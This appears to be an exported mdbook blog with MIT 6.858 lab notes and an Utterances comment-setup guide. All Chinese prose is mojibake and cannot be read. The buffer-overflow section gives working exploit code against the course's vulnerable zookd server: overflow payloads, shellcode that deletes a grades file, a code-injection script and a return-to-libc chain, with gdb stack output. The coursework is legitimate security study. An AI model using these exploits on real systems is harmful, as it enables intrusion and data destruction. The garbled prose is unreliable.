<p>mismatchæ‰¾åˆ°äº†ï¼Œä»æ•°æ®åº“ä¸­queryï¼Œè®¡ç®—å®Œæˆresponseåçš„ä½™é¢æ€»å’Œ</p>
<pre><code class="language-python">  balance2 = sum([p.zoobars for p in pdb.query(zoobar.zoodb.Person).all()])
  if balance1 != balance2:
    report_balance_mismatch()
</code></pre>
<p>æŸ¥çœ‹æ¯ä¸ªç”¨æˆ·çš„æœ€ç»ˆè´¦æˆ·ä½™é¢æ˜¯å¦å’Œäº¤æ˜“è®°å½•ä¸€è‡´</p>
<pre><code class="language-python">  # ...
  # record the initial balances of each user
  balances ={}
  for p in pdb.query(zoobar.zoodb.Person).all():
      balances[p.username]=p.zoobars

  environ = {}
  # ...

# åœ¨Transferè¡¨ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨sender
  final_balances = balances.copy()
  for t in tdb.query(zoobar.zoodb.Transfer).all():
    final_balances[t.sender] -= t.amount
    final_balances[t.recipient] += t.amount

  for p in pdb.query(zoobar.zoodb.Person).all():
    balances[p.username] = p.zoobars

  for k, v in final_balances.items():
    if v != balances[k]:
      report_zoobar_theft()
</code></pre>
<h3 id="exercise-10"><a class="header" href="#exercise-10">Exercise 10</a></h3>
<p>åˆ¤æ–­äº†recipientæ˜¯å¦ä¸ºç©ºä¹‹åï¼Œåªä¼šå‡ºç°theftäº†</p>
<p>å¢åŠ åˆ¤æ–­ sender æ˜¯å¦å’Œ recipientæ˜¯åŒä¸€ä¸ªäºº</p>
<pre><code class="language-python">if recipientp.username == senderp.username:
        raise ValueError()
</code></pre>
<p>todo:å‘ç°bobçš„balanceæ²¡æœ‰å˜è¿‡</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="computer-security---buffer-overflows"><a class="header" href="#computer-security---buffer-overflows">Computer Security - Buffer overflows</a></h1>
<p><a href="http://css.csail.mit.edu/6.858/2022/">MIT6.858</a> -- Computer Systems Security è¯¾ç¨‹</p>
<h2 id="lab-setup"><a class="header" href="#lab-setup">Lab Setup</a></h2>
<p>Enviroments: Mac laptops with the ARM M2 processor</p>
<p>ä¸‹è½½<a href="https://web.mit.edu/6.858/2022/6.858-x86_64-v22.zip">VMé•œåƒ</a>
å®‰è£…qemuï¼ˆx86æ¨¡æ‹Ÿå™¨ï¼‰</p>
<pre><code class="language-sh">brew install qemu
</code></pre>
<p>åˆ é™¤<code>6.858-x86_64-v22.sh</code>ä¸­çš„<code>-enable-kvm</code> flagã€‚æ³¨æ„ï¼Œ<strong>ä¸è¦å°†è¿™ä¸€è¡Œæ³¨é‡Šæ‰</strong>ï¼Œè€Œæ˜¯ç›´æ¥åˆ é™¤ï¼Œå¦åˆ™bashè„šæœ¬å°±æ–­å¼€äº†ï¼Œè¯¦è§<a href="https://stackoverflow.com/a/75082505/13857033">stacks overflow</a></p>
<p>å¯åŠ¨é•œåƒä¹‹åå°±å¯ä»¥ç”¨sshè¿æ¥äº†</p>
<pre><code class="language-sh">ssh -p 2222 student@localhost
</code></pre>
<p>å½“æ—¶è¯¾ç¨‹ç½‘ç«™çš„gitä»“åº“cloneä¸äº†ï¼Œå°±åœ¨<a href="https://github.com/f8nque/mit6858.git">github</a>ä¸Šæ‰¾äº†ä¸€ä¸ª<a href="https://css.csail.mit.edu/6.858/2020/">2020</a>å¹´çš„å®éªŒã€‚</p>
<p>åœ¨<code>~/.ssh/config</code>åŠ ä¸€è¡Œaliasï¼Œæ–¹ä¾¿sshè¿æ¥ã€‚æ¨èä½¿ç”¨vscodeçš„æ’ä»¶ Remote Explorer æ¥è¿æ¥å¼€å‘ç¯å¢ƒ</p>
<pre><code class="language-txt">Host 858vm
  User student
  HostName localhost
  Port 2222
</code></pre>
<h2 id="lab1-buffer-overflows"><a class="header" href="#lab1-buffer-overflows">Lab1 Buffer overflows</a></h2>
<h3 id="part-1-exercise1"><a class="header" href="#part-1-exercise1">Part 1: Exercise1</a></h3>
<p>é¦–å…ˆè¦æ‰¾åˆ°zookdæœåŠ¡å™¨çš„vulnerabilityï¼Œæˆ‘æ‰¾äº†å¦‚ä¸‹å‡ ä¸ªï¼Œä½†æ˜¯è¿˜æœ‰æ›´å¤šã€‚</p>
<ol>
<li>
<p>zookd.c -&gt; http.c:105
process_client ä¸­æœ‰ reqpathæ˜¯åˆ†é…åœ¨æ ˆä¸Šï¼Œprocess_client -&gt; http_request_line -&gt; url_decode
è°ƒç”¨http.cä¸­çš„url_decodeä½œä¸ºdstå‚æ•°ä¼ å…¥ï¼Œä½†æ˜¯http_request_lineä¸­çš„bufè®¾ç½®çš„å¤§å°æ˜¯8192ï¼Œæ¯”reqpathï¼ˆ4096ï¼‰å¤§ï¼Œ
å¦‚æœrequest lineçš„è¯·æ±‚urlè¿‡é•¿ï¼Œé‚£ä¹ˆå°±ä¼šè¦†ç›–reqpathæ‰€åœ¨çš„æ ˆä¸Šå†…å®¹ï¼Œé€ æˆbuffer overflow</p>
</li>
<li>
<p>http.c:286
ç»è¿‡decodeåçš„URIä¼ ç»™ http_serve, å¦‚æœURI(å‚æ•°nameï¼‰å…¨æ˜¯ '\0', é‚£ä¹ˆstrlenæµ‹é‡çš„å­—ç¬¦ä¸²é•¿åº¦å°±ä¸€ç›´æ˜¯0.
strncatå°†nameæ¥åˆ°pnçš„æœ«å°¾åå°±ä¼šè¦†ç›–æ ˆä¸Šçš„å†…å®¹(char pn[2048])
å› æ­¤è¿™ä¸ªé”™è¯¯åº”è¯¥ä¼šæ¯”ä¸Šé¢çš„é‚£ä¸ªé”™è¯¯å…ˆè¢«è§¦å‘ï¼ˆhttp_serveè¿”å›æ—¶ï¼‰
ä¸å®¹æ˜“è§¦å‘ï¼Œæœ‰é˜²æŠ¤</p>
</li>
<li>
<p>http.c:23
touchå‡½æ•°æ¥å—çš„å‚æ•°å¦‚æœè¿‡é•¿ï¼Œä¼šé€ æˆæ ˆæº¢å‡º</p>
</li>
<li>
<p>http.c:159
åœ¨å¤„ç†http_request_headeræ—¶ï¼Œvalueæ˜¯åœ¨æ ˆä¸Šåˆ†é…çš„(char value[512])ï¼Œè¯·æ±‚ä½“çš„å‚æ•°å€¼è¢«url_decodeåˆ°valueåï¼Œæ²¡æœ‰æ£€æµ‹é•¿åº¦
åŸºäºè¿™ä¸ªæ„é€ è¯·æ±‚ä½“ï¼š</p>
</li>
</ol>
<pre><code>injectValue = b&quot;a&quot; * 600
req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
        b&quot;Exploid: &quot; + injectValue + \
        b&quot;\r\n&quot;
</code></pre>
<h3 id="exercise2"><a class="header" href="#exercise2">Exercise2</a></h3>
<p>å†ä½¿ç”¨buffer overflowçš„æŠ€æœ¯å¯¼è‡´æœåŠ¡å™¨å´©æºƒï¼ˆæš‚æ—¶ä¸éœ€è¦æ³¨å…¥shellcodeï¼‰ã€‚ä¸»è¦åŸç†å°±æ˜¯è¦†ç›–æ ˆä¸Šä¿å­˜çš„è¿”å›åœ°å€ï¼Œè®©ç¨‹åºè¿”å›åˆ°æ— æ•ˆçš„åœ°å€ã€‚
ä½¿ç”¨ä¸Šé¢æ‰¾åˆ°çš„ç¬¬4ä¸ªvulnerabilityæ¥æ„é€ æ”»å‡»ï¼Œä¸»è¦æ˜¯æº¢å‡º <code>http.c:http_request_header</code>ä¸­çš„valueã€‚</p>
<pre><code class="language-python">def build_exploit():
    injectValue = b&quot;a&quot; * 600
    req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
            b&quot;Exploid: &quot; + injectValue + \
            b&quot;\r\n&quot;
    return req
</code></pre>
<h3 id="part-2-code-injection"><a class="header" href="#part-2-code-injection">Part 2: Code Injection</a></h3>
<p>zookdè¿™ä¸ªhttp serverçš„æ ˆæ˜¯å¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥å¯ä»¥å¾€æ ˆä¸Šæ³¨å…¥ä»£ç ï¼Œé€šè¿‡è¦†ç›–äº†å½“å‰å‡½æ•°çš„è¿”å›å€¼ï¼Œè·³åˆ°æ ˆä¸­injected codeçš„èµ·å§‹ä½ç½®ï¼Œå¯ä»¥æ‰§è¡Œæ”»å‡»è€…çš„ä»£ç ã€‚</p>
<p><strong>exercise 3</strong>
ä¿®æ”¹Shellcode.Sæ¥å®Œæˆ unlink ç³»ç»Ÿè°ƒç”¨çš„è¿è¡Œï¼Œå®Œæˆunlink <code>/home/student/grades.txt</code>ã€‚</p>
<pre><code class="language-asm">#include &lt;sys/syscall.h&gt;

#define STRING  &quot;/home/student/grades.txt&quot;
#define STRLEN  24
#define ARGV    (STRLEN+1)

.globl main
  .type main, @function

 main:
  jmp calladdr

 popladdr:
  popq  %rcx       /* get the STRING address */
  movq  %rcx,(ARGV)(%rcx) /* set up argv pointer to pathname */
  xorq  %rax,%rax   /* get a 64-bit zero value */
  movb  %al,(STRLEN)(%rcx)  /* null-terminate our string */

  movb  $SYS_unlink,%al   /* set up the syscall number */
  movq  %rcx,%rdi   /* syscall arg 1: string pathname */
  syscall       /* invoke syscall */

  xorq  %rax,%rax   /* get a 64-bit zero value */
  movb    $SYS_exit,%al   /* set up the syscall number */
  xorq  %rdi,%rdi   /* syscall arg 1: 0 */
  syscall       /* invoke syscall */

 calladdr:
  call  popladdr
  .ascii  STRING
</code></pre>
<p><strong>exercise 4</strong>
ä½¿ç”¨gdbæ‰¾åˆ° http_request_headers ä¸­valueåœ¨æ ˆä¸Šçš„ä½ç½®ï¼Œè¿™ä¸ªä½ç½®å°±æ˜¯æ³¨å…¥ä»£ç çš„å¼€å§‹ä½ç½®ã€‚æ³¨æ„ï¼šä½¿ç”¨gdbæ—¶è¦åœ¨ç›®å½•<code>~/lab</code>ä¸‹è¿è¡Œï¼Œè¿™æ ·gdbæ‰èƒ½è¯»å–<code>.gdbinit</code>æ–‡ä»¶ï¼Œè·Ÿéšå­è¿›ç¨‹è·³è½¬ã€‚</p>
<pre><code>(gdb) print &amp;value[0]
$1 = 0x7fffffffda50
(gdb) print &amp;envvar[0]
$1 = 0x7fffffffd850
(gdb) info frame
Stack level 0, frame at 0x7fffffffdc90:
 rip = 0x555555556f4b in http_request_headers (http.c:124); 
    saved rip = 0x555555556b29
 called by frame at 0x7fffffffecc0
 source language c.
 Arglist at 0x7fffffffdc80, args: fd=4
 Locals at 0x7fffffffdc80, Previous frame's sp is 0x7fffffffdc90
 Saved registers:
  rbx at 0x7fffffffdc78, rbp at 0x7fffffffdc80, rip at 0x7fffffffdc88
</code></pre>
<p>å¯ä»¥çœ‹åˆ°å½“å‰æ ˆå¸§çš„ä¿å­˜çš„rbpã€ripæ‰€åœ¨çš„æ ˆä¸Šçš„åœ°å€ã€‚</p>
<p>å®Œæˆexploit-2.py</p>
<pre><code class="language-python">&quot;&quot;&quot;
  bottom of                                             top of
  memory                                                memory

          envvar            value          i    sbp        ret
  &lt;-- [0          512][ 0           512 ][   ][        ][        ] main...
&quot;&quot;&quot;
addr_value_buffer = 0x7fffffffda50
addr_retaddr = 0x7fffffffdc88

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.quote(s)
    ##     returns string s with &quot;special&quot; characters percent-encoded
    ##   struct.pack(&quot;&lt;Q&quot;, x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x

    # å°†shellcodeä¹‹ååˆ°retå¼€å§‹åœ°å€çš„ä¸­é—´å†…å®¹å¡«å……æ»¡
    shellcode += b&quot;A&quot; * ((addr_retaddr - addr_value_buffer) - len(shellcode))

    # è¦†ç›–è¿”å›åœ°å€ä¸ºvalue_bufferçš„èµ·å§‹åœ°å€
    shellcode += struct.pack(&quot;&lt;Q&quot;, addr_value_buffer)

    req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
            b&quot;Exploid: &quot; + shellcode + \
            b&quot;\r\n&quot;
    return req

</code></pre>
<h3 id="part-3-return-to-libc"><a class="header" href="#part-3-return-to-libc">Part 3: Return to libc</a></h3>
<p>å½“zookdçš„æ ˆè¢«æ ‡å¿—ä¸ºä¸å¯æ‰§è¡Œåï¼Œå°±ä¸èƒ½é€šè¿‡æ³¨å…¥ä»£ç æ¥å®Œæˆæ”»å‡»äº†ï¼Œåªèƒ½ä½¿ç”¨Return-Oriented-Programmingçš„æŠ€æœ¯ï¼Œæ‰¾ç°æœ‰ç¨‹åºæ±‡ç¼–ä»£ç ä¸­çš„gadgetï¼Œé€šè¿‡æ¯æ¬¡è¦†ç›–è¿”å›åœ°å€ï¼Œä¸æ–­åœ°è·³è½¬ï¼Œå®Œæˆæ–­ç« å–ä¹‰å¼çš„æ”»å‡»ã€‚</p>
<p>è¿™ä¸ªlabç»™äº†ä¸€ä¸ªç°æœ‰çš„gadgetï¼šaccidentallyå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä»–çš„æ±‡ç¼–ï¼š</p>
<pre><code class="language-asm">(gdb) disas accidentally
Dump of assembler code for function accidentally:
   0x000055555540188a &lt;+0&gt;: push   %rbp
   0x000055555540188b &lt;+1&gt;: mov    %rsp,%rbp
   0x000055555540188e &lt;+4&gt;: mov    0x10(%rbp),%rdi
   0x0000555555401892 &lt;+8&gt;: nop
   0x0000555555401893 &lt;+9&gt;: pop    %rbp
   0x0000555555401894 &lt;+10&gt;:  ret    
End of assembler dump.
</code></pre>
<p>ä¾æ—§ä½¿ç”¨http_request_headersä¸­çš„value bufferåšæº¢å‡ºã€‚ç”»å‡ºbreakpointè®¾ç½®åœ¨http_request_headerä½ç½®æ—¶çš„æ ˆï¼Œä¾¿äºç†è§£</p>
<pre><code class="language-txt">            64bit          0
            |process_client|
            +--------------+ 16 byte
            |    ret addr  |   --&gt; å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ ï¼ˆéœ€è¦è¢«è¦†ç›–ä¸ºaccidentallyçš„èµ·å§‹åœ°å€ï¼‰
            +--------------+ 8
            |   saved bp   |   --&gt; ä¿å­˜çš„ebp
    ebp -&gt;  +--------------+ 0
            |      int i   |
            +--------------+ -8
            |              |
            |              |
            |              |
            +--------------+ &lt;- value èµ·å§‹åœ°å€
</code></pre>
<p>æˆ‘ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯æŠŠ pathstr:<code>/home/student/grades.txt</code>ä»¥åŠå¡«å……çš„è¿”å›åœ°å€éƒ½æ”¾åœ¨value bufferä¸­ï¼Œä½†æ˜¯å‘ç°ç”±äºaccidentallyä½¿ç”¨ <code>mov    0x10(%rbp),%rdi</code>æ¥è·å–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œè€Œè¿™ä¸ªpathstråŠ ä¸Š<code>\0</code>çš„ç»“å°¾å­—ç¬¦ï¼Œé•¿åº¦è¶…è¿‡äº†24ï¼ˆ0x10 + 8)ã€‚ä¸å¤Ÿæ”¾å…¶ä»–çš„è¿”å›åœ°å€ï¼Œå¦åˆ™ä¸èƒ½å¯¹é½ã€‚æ‰€ä»¥åªèƒ½é€‰æ‹©ä»ret_addrå¼€å§‹è¿›è¡Œæº¢å‡ºï¼Œvalueåˆ°ret_addrä¹‹é—´éƒ½å¡«å……ä¸ºgarbageã€‚</p>
<p>å‡è®¾å®Œæˆäº†æ ˆä¸Šçš„æº¢å‡ºï¼Œç»§ç»­ç”»å‡ºè°ƒç”¨åˆ°accidentallyå¼€å§‹æ—¶çš„æ ˆå¸§ï¼š</p>
<pre><code class="language-txt">            64bit          0
            |              |
            +              + 40 byte
            |  pathstr     |   --&gt; è¦†ç›–ä¸ºçœŸæ­£å­˜å‚¨ pathstr çš„ä½ç½®
            +--------------+ 32
            |  pathstr_addr|  --&gt; 0x10(%rbp) æ‰€æŒ‡å‘çš„ä½ç½®ï¼Œè¦†ç›–ä¸º pathstr çš„èµ·å§‹åœ°å€ $rbp+32
            +--------------+ 24 
            |unlink_addr   |   accidentallyçš„è¿”å›åœ°å€åº”è¯¥è¢«è¦†ç›–ä¸º unlink å‡½æ•°çš„èµ·å§‹åœ°å€
            +--------------+ 16
            | random rbp   |  ç”±äºpush rbpè€Œå½¢æˆçš„  (åŸæ¥æ”¾ç€è¦†ç›–çš„accidentallyçš„èµ·å§‹åœ°å€)
            +--------------+ 8  &lt;-- rsp ï¼Œç”±äºmove rsp rbpï¼Œæ­¤æ—¶rbpä¹ŸæŒ‡å‘è¿™é‡Œ
</code></pre>
<p>æ‰€ä»¥æœ€ç»ˆåœ¨http_request_headerä¸­æ ˆå¸§åº”è¯¥è¢«è¦†ç›–ä¸ºï¼š</p>
<pre><code class="language-txt">            64bit          0
            |              |
            +--------------+ 48 byte
            |              |  
            +              + 40
            |   pathstr    |
            +--------------+ 32 
            | pathstr_addr |   
            +--------------+ 24
            | unlink_addr  |
            +--------------+ 16 byte
            |    ret addr  |   --&gt; å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ è¦†ç›–ä¸ºaccidentallyçš„èµ·å§‹åœ°å€
            +--------------+ 8  - +
            |   saved bp   |      |
    rbp -&gt;  +--------------+ 0    |
            |      int i   |      |     } -&gt; fill with junk
            +--------------+ -8   |
            |              |      |
            |              |      |
str_addr -&gt; +--------------+ &lt;- value èµ·å§‹åœ°å€ -512
</code></pre>
<p>å› æ­¤filenameæ‰€åœ¨çš„ä½ç½®å°±æ˜¯ï¼š</p>
<pre><code>(gdb) print $rbp + 32
$4 = (void *) 0x7fffffffdca0
</code></pre>
<p>æ³¨æ„filenameåé¢ä¹Ÿè¦åŠ \r\n</p>
<pre><code class="language-python">addr_value_buffer = 0x7fffffffda50
addr_retaddr = 0x7fffffffdc88
addr_rbpaddr = 0x7fffffffdc80 # http_request_headerä¸­$rbpæ‰€æŒ‡å‘çš„ä½ç½®
addr_accidentally = 0x55555540188a # ç¬¬ä¸€æ¬¡å°è¯•çš„æ—¶å€™æŠŠè¿™ä¸ªè¿”å›åœ°å€æé”™äº†
libc_unlink_addr = 0x1555554011c0
filename_addr = addr_rbpaddr + 32

# è¾“å…¥64ä½int
def percent_hex_encode(payload: int):
    r = b&quot;&quot;
    for c in payload:  # for every char at payload
        #           è½¬æ¢ä¸ºå•å­—èŠ‚       è½¬æ¢ä¸º16è¿›åˆ¶è¡¨ç¤ºçš„str ç¼–ç ä¸ºbytes
        r += b&quot;%&quot; + c.to_bytes(1, &quot;little&quot;).hex().encode()
    return r

def build_exploit():
    ## Things that you might find useful in constructing your exploit:
    ##
    ##   urllib.quote(s)
    ##     returns string s with &quot;special&quot; characters percent-encoded
    ##   struct.pack(&quot;&lt;Q&quot;, x)
    ##     returns the 8-byte binary encoding of the 64-bit integer x


    # å°†shellcodeä¹‹ååˆ°retå¼€å§‹åœ°å€çš„ä¸­é—´å†…å®¹å¡«å……æ»¡
    filename = b&quot;/home/student/grades.txt&quot; + b&quot;\0&quot; + b&quot;\r\n&quot;

    # å…¶ä»–éƒ¨åˆ†å¡«å……garbage
    shellcode = b&quot;A&quot; * (addr_retaddr - addr_value_buffer)

    # è¦†ç›–åˆ°æ ˆä¸Šçš„å„ä¸ªåœ°å€
    payload = b&quot;&quot;
    # è¦†ç›–http_request_headerè¿”å›åœ°å€ä¸ºaccidentallyçš„èµ·å§‹åœ°å€
    payload += struct.pack(&quot;&lt;Q&quot;, addr_accidentally)
    # è¦†ç›–accidentallyçš„è¿”å›åœ°å€ä¸ºunlinkçš„èµ·å§‹åœ°å€
    payload += struct.pack(&quot;&lt;Q&quot;, libc_unlink_addr)
    # è¦†ç›–ä¸ºfilnameçš„èµ·å§‹åœ°å€ $rbp+32 ï¼ˆå³å¯¹äºaccidentallyæ ˆå¸§æ¥è¯´ 0x10(%rbp) æ‰€æŒ‡å‘çš„ä½ç½® ï¼‰
    payload += struct.pack(&quot;&lt;Q&quot;, filename_addr)
    # ç”±äºæˆ‘ä»¬è¦æ”»å‡»url_decodeå‡½æ•°ï¼Œä½†æ˜¯url_decodeé‡åˆ°\0å­—èŠ‚å°±ä¼šåœæ­¢è¯»å–äº†ï¼Œ
    # æ‰€ä»¥è¦æŠŠè¾“å…¥çš„å·²ç»è½¬æ¢ä¸º64bitçš„å­—èŠ‚åºåˆ—ï¼Œè½¬æ¢ä¸º%ç™¾åˆ†å·encodeçš„ç¼–ç 

    # å°† \0 ç¼–ç ä¸º %00
    shellcode += percent_hex_encode(payload)
    
    # å†™å…¥filename
    shellcode += filename

    req =   b&quot;GET / HTTP/1.0\r\n&quot; + \
            b&quot;Exploid: &quot; + shellcode + \
            b&quot;\r\n&quot;
    return req
</code></pre>
<p>ä½¿ç”¨gdbæ¥æ£€æŸ¥
åœ¨http_request_headerè®¾ç½®æ–­ç‚¹ï¼Œæ£€æŸ¥overflowçš„å†…å®¹æ˜¯å¦å·²ç»å…¨éƒ¨å†™ä¸Šå»äº†</p>
<pre><code class="language-gdb">(gdb) x/g $rbp + 8
0x7fffffffdc88: 0x0000555555556b8c
(gdb) x/g $rip
0x555555401d8c &lt;http_request_headers+365&gt;:  0x4800001499358d48
(gdb) x/g $rbp + 16
0x7fffffffdc90: 0x00001555554011c0
(gdb) print *(char *)($rbp + 32)
$16 = 47 '/'
(gdb) print (char *)($rbp + 32)
$17 = 0x7fffffffdca0 &quot;/home/student/grades.txt&quot;
(gdb) x/g $rbp + 24
0x7fffffffdc98: 0x00007fffffffdca0
(gdb) print $rbp + 32
$18 = (void *) 0x7fffffffdca0
</code></pre>
<h3 id="part-4-fix"><a class="header" href="#part-4-fix">Part 4: fix</a></h3>
<p>ç¬¬å››éƒ¨åˆ†å°±æ˜¯ä¿®å¤ä¹‹å‰ç”¨åˆ°çš„æ¼æ´ï¼Œä¸»è¦å°±æ˜¯å‡ ä¸ªbufferçš„é•¿åº¦é—®é¢˜ï¼Œå°¤å…¶æ˜¯url_decodeæ—¶dstçš„é•¿åº¦çš„æä¾›ã€‚</p>
<h2 id="çŸ¥è¯†è¡¥å……"><a class="header" href="#çŸ¥è¯†è¡¥å……">çŸ¥è¯†è¡¥å……</a></h2>
<h3 id="x86"><a class="header" href="#x86">x86</a></h3>
<p>x86å†…å­˜å¸ƒå±€ã€å¯„å­˜å™¨ç›¸å…³ã€å‡½æ•°è°ƒç”¨å¯ä»¥å‚è€ƒ<a href="https://textbook.cs161.org/memory-safety/x86.html">cs161</a>è¯¾ç¨‹</p>
<p><a href="https://thesquareplanet.com/blog/smashing-the-stack-21st-century/">Smashing the Stack in the 21st Century</a></p>
<h3 id="gdb"><a class="header" href="#gdb">gdb</a></h3>
<p><a href="https://visualgdb.com/gdbreference/commands/x">command</a></p>
<h3 id="shell"><a class="header" href="#shell">shell</a></h3>
<p>sedçš„ <code>\1-9</code> æå–åŒ¹é…çš„æ¨¡å¼ã€‚såŠ¨ä½œè¡¨ç¤ºæ›¿æ¢ <code>s'/oldstr/newstr/g</code></p>
<pre><code class="language-sh">$ echo QEMU emulator version 7.2.0 | sed 's/QEMU emulator \([a-zA-Z]*\) \([0-9]\)\.\([0-9]\).*/\1.\2.\3/'
version.7.2
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="utterances-å®ç°åšå®¢è¯„è®ºåŠŸèƒ½"><a class="header" href="#utterances-å®ç°åšå®¢è¯„è®ºåŠŸèƒ½">Utterances å®ç°åšå®¢è¯„è®ºåŠŸèƒ½</a></h1>
<p><a href="https://utteranc.es/">Utterances</a>åˆ©ç”¨githubä¸Šissueçš„åŠŸèƒ½ï¼Œæ¥å®Œæˆå¯¹è¯„è®ºçš„å­˜å‚¨å’Œåˆ†ç±»ï¼Œæ˜ å°„åˆ°ä¸åŒçš„åšå®¢æ–‡ç« urlä¸Šã€‚</p>
<p>åœ¨æ ‡å‡†çš„html-jsç½‘ç«™ä¸­ï¼Œåªéœ€è¦åœ¨å¯¹åº”çš„githubä»“åº“å®‰è£… utterances GitHub app ï¼Œå†åœ¨éœ€è¦è¯„è®ºçš„é¡µé¢å¼•å…¥ä¸‹é¢è„šæœ¬å³å¯ã€‚</p>
<pre><code class="language-html">&lt;script src=&quot;https://utteranc.es/client.js&quot;
        repo=&quot;[ENTER REPO HERE]&quot;
        issue-term=&quot;pathname&quot;
        label=&quot;comment&quot;
        theme=&quot;github-light&quot;
        crossorigin=&quot;anonymous&quot;
        async&gt;
&lt;/script&gt;
</code></pre>
<h2 id="mdbook-è¦†ç›–ä¸»é¢˜"><a class="header" href="#mdbook-è¦†ç›–ä¸»é¢˜">mdbook è¦†ç›–ä¸»é¢˜</a></h2>
<p>ç”±äºmdbookæ˜¯ç”¨handlebarsæ¥å†™æ¨¡æ¿é¡µé¢çš„ï¼Œæƒ³è¦è¯„è®ºä¸»é¢˜éšç€åšå®¢ä¸»é¢˜åŒæ—¶å˜åŒ–æ‰€ä»¥è¿˜éœ€è¿›ä¸€æ­¥æ“ä½œã€‚</p>
<p>mdbookæœ‰themeè¦†ç›–çš„åŠŸèƒ½ï¼Œå³å¯ä»¥ç”¨åŒåçš„æ–‡ä»¶æ¥è¦†ç›–åŸæœ‰çš„å‰ç«¯ä»£ç ã€‚
ä½¿ç”¨<code>mdbook init --theme</code>ç”ŸæˆåŒ…å«themeæ–‡ä»¶å¤¹çš„åˆå§‹å·¥ç¨‹ï¼Œä¹‹åæŠŠå…¶ä¸­çš„themeæ–‡ä»¶å¤¹å¤åˆ¶åˆ°å½“å‰çš„åšå®¢ç›®å½•ä¸­ï¼Œåœ¨<code>book.toml</code>ä¸­æŒ‡å®šç”¨æ­¤æ–‡ä»¶å¤¹æ¥è¦†ç›–åŸæœ‰çš„themeã€‚æˆ‘ä»¬åªéœ€å˜åŠ¨<code>index.hbs</code>æ–‡ä»¶ï¼Œæ‰€ä»¥themeç›®å½•ä¸­çš„å…¶ä»–æ–‡ä»¶å¯ä»¥åˆ é™¤äº†ã€‚å†åˆ›å»ºä¸€ä¸ªç”¨äºå¢åŠ è¯„è®ºçš„è„šæœ¬æ–‡ä»¶<code>comments.js</code>ã€‚</p>
<pre><code class="language-toml">[output.html]
theme = &quot;theme&quot;
additional-js = [&quot;theme/comments.js&quot;]
</code></pre>
<h2 id="jså®ç°"><a class="header" href="#jså®ç°">jså®ç°</a></h2>
<p><code>comments.js</code>ä¸»è¦æ ¹æ®å½“å‰çš„åšå®¢ä¸»é¢˜åŠ¨æ€åœ°ç”Ÿæˆå¼•å…¥utterancesçš„<code>&lt;script&gt;</code>æ ‡ç­¾ã€‚loadCommentså‡½æ•°å®ç°äº†è¿™ä¸ªåŠŸèƒ½ã€‚</p>
<pre><code class="language-javascript">function loadComments() {
    // console.log(&quot;loading comments.&quot;);
    const page = document.querySelector(&quot;.page&quot;);

    const isLight = document.querySelector('html').getAttribute('class').indexOf('light') != -1;

    const commentScript = document.createElement('script')
    const commentsTheme = isLight ? 'github-light' : 'github-dark'
    commentScript.async = true
    commentScript.src = 'https://utteranc.es/client.js'
    commentScript.setAttribute('repo', 'Sugar-Coder/Sugar-Coder.github.io')
    commentScript.setAttribute('issue-term', 'pathname')
    commentScript.setAttribute('id', 'utterances')
    commentScript.setAttribute('label', 'comment')
    commentScript.setAttribute('theme', commentsTheme)
    commentScript.setAttribute('crossorigin', 'anonymous')

    page.appendChild(commentScript);
}

loadComments();
</code></pre>
<p>ä¸ºäº†ç›‘å¬ç”¨æˆ·æ”¹å˜åšå®¢ä¸»é¢˜ï¼Œä½¿ç”¨ <a href="https://developer.mozilla.org/en-US/docs/Web/API/MutationObserver">MutationObserver</a> æ¥ç›‘å¬htmlçš„classå±æ€§å˜åŠ¨ã€‚å¦‚æœå‘ç”Ÿäº†ä»æ˜äº®ä¸»é¢˜åˆ°æš—è‰²ä¸»é¢˜çš„å˜åŠ¨ï¼Œé‚£ä¹ˆå°±é‡æ–°åŠ è½½commentsã€‚</p>
<pre><code class="language-javascript">function removeComments() {
    const page = document.querySelector(&quot;.page&quot;);
    page.removeChild(page.lastChild);
}

(function observeChange() {
    const html=document.querySelector('html')
    const options={
        attributes:true,//è§‚å¯Ÿnodeå¯¹è±¡çš„å±æ€§
        attributeFilter:['class']//åªè§‚å¯Ÿclasså±æ€§
    }
    let prevIsLight = document.querySelector('html').getAttribute('class').indexOf('light') != -1;
    var mb=new MutationObserver(function(mutationRecord,observer){
        let isLight = document.querySelector('html').getAttribute('class').indexOf('light') != -1;
        // console.log(`prevIsLight:${prevIsLight}, isLight:${isLight}`)
        if (prevIsLight != isLight) {
            removeComments();
            loadComments();
            prevIsLight = isLight;
        }
    })
    mb.observe(html,options)
})();
</code></pre>
<p>è¿™æ ·å°±å®ç°äº†åŠ¨æ€è¯„è®ºä¸»é¢˜ã€‚</p>
<h2 id="ä½¿ç”¨åŸºäºreactçš„æ–¹å¼å¢åŠ utterances"><a class="header" href="#ä½¿ç”¨åŸºäºreactçš„æ–¹å¼å¢åŠ utterances">ä½¿ç”¨åŸºäºReactçš„æ–¹å¼å¢åŠ utterances</a></h2>
<p><strong>Note</strong>: è¿™ä¸ªæ–¹æ³•ç°åœ¨å·²ç»ä¸ç”¨äº†ï¼Œå¤šå¼•å…¥äº†å¾ˆå¤šä¾èµ–ï¼Œæˆ‘ç°åœ¨ä½¿ç”¨ä¸Šé¢çš„çº¯jsæ–¹æ³•æ¥å®Œæˆè¯„è®ºçš„ç”Ÿæˆã€‚</p>
<p>å‘åŸºäºreactæ„å»ºçš„åšå®¢åŠ å…¥utteranceså¯ä»¥å‚è€ƒè¿™ç‰‡<a href="https://abba.dev/blog/blog-comments-with-utterances">æ–‡ç« </a>ã€‚</p>
<h3 id="step1-add-a-dom-container-to-the-html"><a class="header" href="#step1-add-a-dom-container-to-the-html">Step1: Add a DOM Container to the HTML</a></h3>
<p>åœ¨<code>index.hbs</code>ä¸­å¢åŠ ä¸€ä¸ªç©ºçš„ <code>&lt;div&gt;</code> å®¹å™¨ï¼Œæ¥æ”¾Reactç”Ÿæˆçš„å…ƒç´ ã€‚</p>
